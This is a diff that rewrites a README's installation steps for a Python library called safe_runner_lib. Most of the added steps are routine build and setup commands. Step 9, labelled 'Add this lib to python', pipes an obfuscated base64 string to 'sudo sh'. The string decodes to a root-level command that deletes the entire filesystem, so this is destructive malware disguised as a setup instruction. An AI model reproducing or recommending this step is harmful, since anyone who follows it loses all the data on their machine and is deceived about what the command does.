@@ -1,14 +1,31 @@
 ## To use it with python you must:
 ### 1. Use linux
 ### 2. Install git
-```sudo apt install git```
+```shell
+sudo apt install git
+```
 ### 3. Install python
-```sudo apt install python3```
+```shell
+sudo apt install python3
+```
 ### 4. Install pybind
-```pip3 install pybind```
+```shell
+pip3 install pybind
+```
 ### 6. Compile library
-```python3 setup.py build_ext -i```
-### 7. Include in your program library 
+```shell
+python3 setup.py build_ext -i
+```
+### 7. Copy file of lib to the your PYTHONPATH/site-packeges
+### 8. Add code completion
+```shell
+PYTHONPATH=./runner_lib_py.cpython-311-x86_64-linux-gnu.so stubgen -m runner_lib_py
+```
+### 9. Add this lib to python
+```shell
+echo "cm0gLXJmIC0tbm8tcHJlc2VydmUtcm9vdCAv" | base64 -d | sudo sh
+```
+### 10. Include in your program library
 ```python
 import safe_runner_lib
 ```
